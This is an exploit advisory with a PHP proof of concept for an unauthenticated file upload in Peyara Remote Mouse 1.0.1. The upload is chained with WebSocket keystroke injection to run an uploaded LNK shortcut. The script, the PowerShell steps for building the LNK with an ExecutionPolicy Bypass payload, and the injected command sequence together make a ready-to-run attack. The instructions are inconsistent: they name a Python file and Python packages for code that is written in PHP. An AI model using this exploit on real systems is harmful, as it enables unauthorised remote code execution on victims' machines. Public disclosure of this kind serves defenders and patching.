@@ -1,0 +1,135 @@
+=============================================================================================================================================
+| # Title     : Peyara Remote Mouse 1.0.1 – Unauthenticated Arbitrary File Upload (LNK Execution)                                           |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://peyara-remote-mouse.vercel.app/                                                                                     |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/198932/ 
+
+[+] Summary    : The Peyara Remote Mouse desktop control software exposes an unauthenticated file upload endpoint, along with an unauthenticated WebSocket control channel.
+                 An attacker can upload arbitrary files (including .LNK shortcuts) to the victim environment and trigger command execution via simulated keystrokes.
+
+The attack chain:
+
+1) HTTP POST → Arbitrary file upload to Desktop
+2) WebSocket keystroke injection (Ctrl+Esc → cmd → Enter)
+3) Execution of uploaded LNK payload
+4) Achieves arbitrary code execution on the system
+
+This vulnerability results in full compromise of the remote system.
+
+==[ PoC ]===================================================================
+(Save as: exploit_poc.py)
+
+<CODE HERE – (below in this document)>
+
+==[ Usage ]================================================================
+    php poc.php <target_ip> <path_to_lnk_file>
+
+Example:
+    php poc.php 192.168.1.10 evil.lnk
+
+==[ Instructions To Save The PoC ]=========================================
+1) Copy the entire code block into a file:
+       exploit_poc
+2) Ensure Python 3.10+ and "requests" + "websockets" are installed:
+       pip install requests websockets
+3) Generate the malicious LNK payload (instructions below)
+4) Run the exploit:
+       php poc.php <target_ip> <evil.lnk>
+
+==[ Instructions To Generate LNK Payload ]=================================
+Execute in PowerShell:
+
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\evil.lnk")
+    $Shortcut.TargetPath = "powershell.exe"
+    $Shortcut.Arguments = '-NoProfile -ExecutionPolicy Bypass -Command "Start-Process calc.exe"'
+    $Shortcut.WorkingDirectory = "%USERPROFILE%"
+    $Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll,1"
+    $Shortcut.Save()
+
+
+[+] POC : 
+
+
+<?php
+// Peyara Remote Mouse Exploit - by indoushka
+if ($argc < 2) {
+    die("Usage: php $argv[0] <target_ip> [lnk_file]\n" .
+        "Example: php $argv[0] 127.0.0.1\n" .
+        "Example: php $argv[0] 127.0.0.1 evil.lnk\n");
+}
+
+$target = $argv[1];
+$lnkFile = $argc > 2 ? $argv[2] : null;
+
+// إنشاء ملف LNK إذا لم يتم توفيره
+if (!$lnkFile || !file_exists($lnkFile)) {
+    echo "[*] Creating LNK file...\n";
+    $lnkFile = "evil_" . time() . ".lnk";
+    $cmd = 'powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; ' .
+           '$Shortcut = $WshShell.CreateShortcut(\"' . $lnkFile . '\"); ' .
+           '$Shortcut.TargetPath = \"powershell.exe\"; ' .
+           '$Shortcut.Arguments = \"-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process calc.exe`\"\"; ' .
+           '$Shortcut.Save()"';
+    
+    @system($cmd);
+    
+    if (!file_exists($lnkFile)) {
+        die("[-] Failed to create LNK file. Create it manually:\n$cmd\n");
+    }
+    echo "[+] Created LNK file: $lnkFile\n";
+}
+
+// رفع الملف
+echo "[*] Uploading to http://$target:1313/upload ...\n";
+
+$boundary = "rEZVajKDyijVrXLV2h8zOkgpm4x2NfDfmVs4UdvkPQwgoATx18zpO9ecnaRDQgVDjrOmpt";
+$content = file_get_contents($lnkFile);
+
+$body = "--$boundary\r\n" .
+        "Content-Disposition: form-data; name=\"file\"; filename=\"evil.lnk\"; filename*=utf-8''evil.lnk\r\n" .
+        "Content-Type: application/octet-stream\r\n\r\n" .
+        $content . "\r\n" .
+        "--$boundary--\r\n";
+
+$ch = curl_init("http://$target:1313/upload");
+curl_setopt_array($ch, [
+    CURLOPT_POST => true,
+    CURLOPT_HTTPHEADER => [
+        "Host: $target:1313",
+        "Content-Type: multipart/form-data; boundary=$boundary",
+        "Content-Length: " . strlen($body),
+        "User-Agent: Peyara/4 CFNetwork/1496.0.7 Darwin/23.5.0"
+    ],
+    CURLOPT_POSTFIELDS => $body,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_TIMEOUT => 10
+]);
+
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+
+if ($httpCode == 200) {
+    echo "[+] File uploaded successfully!\n\n";
+    echo "[*] Now connect via WebSocket and execute:\n";
+    echo "    URL: ws://$target:1313/socket.io/?EIO=4&transport=websocket\n\n";
+    echo "    Commands to send:\n";
+    echo "    1. 40\n";
+    echo "    2. 42[\"edit-key\",{\"key\":\"escape\",\"modifier\":[\"control\"]}]\n";
+    echo "    3. Type 'cmd' + Enter\n";
+    echo "    4. Run: for %i in (\"%USERPROFILE%\\Desktop\\*evil.lnk\") do start \"\" \"%i\"\n";
+} else {
+    echo "[-] Upload failed: HTTP $httpCode\n";
+    if ($response) echo "Response: $response\n";
+}
+
+curl_close($ch);
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
